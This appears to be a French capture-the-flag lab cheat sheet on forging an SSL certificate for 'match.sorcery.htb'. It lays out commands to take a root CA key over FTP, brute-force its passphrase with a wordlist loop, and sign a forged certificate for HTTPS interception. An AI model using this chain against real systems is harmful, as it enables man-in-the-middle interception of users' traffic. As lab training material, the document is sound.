# Forgerie de Certificats SSL

## <mark style="color:red;">Forgerie de Certificats SSL</mark>

#### 🎯 Concept

La forgerie de certificat SSL permet de créer des certificats signés par une Autorité de Certification (CA) compromise pour intercepter du trafic HTTPS.

#### 🔍 Architecture PKI

```
Root CA (compromis)
    ↓ signe
Certificat match.sorcery.htb (forgé)
    ↓ utilisé par
Serveur malveillant (mitmproxy)
```

#### 💡 Processus de forgerie

**1. Récupération des fichiers CA**

```bash
ftp 172.19.0.3
> cd pub
> get RootCA.crt
> get RootCA.key
```

**2. Bruteforce de la passphrase**

```bash
#!/bin/bash
while read pass; do
    openssl rsa -in RootCA.key -out /dev/null -passin pass:"$pass" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Passphrase: $pass"
        exit 0
    fi
done < /usr/share/wordlists/rockyou.txt
```

**3. Génération de la clé privée**

```bash
openssl genrsa -out match.sorcery.htb.key 2048
```

**4. Création de la demande de certificat (CSR)**

```bash
openssl req -new \
    -key match.sorcery.htb.key \
    -out match.sorcery.htb.csr \
    -subj "/CN=match.sorcery.htb"
```

**5. Déchiffrement de la clé CA**

```bash
openssl rsa -in RootCA.key -out RootCA-unenc.key
# Enter pass phrase: password
```

**6. Signature du certificat**

```bash
openssl x509 -req \
    -in match.sorcery.htb.csr \
    -CA RootCA.crt \
    -CAkey RootCA-unenc.key \
    -CAcreateserial \
    -out match.sorcery.htb.crt \
    -days 365
```
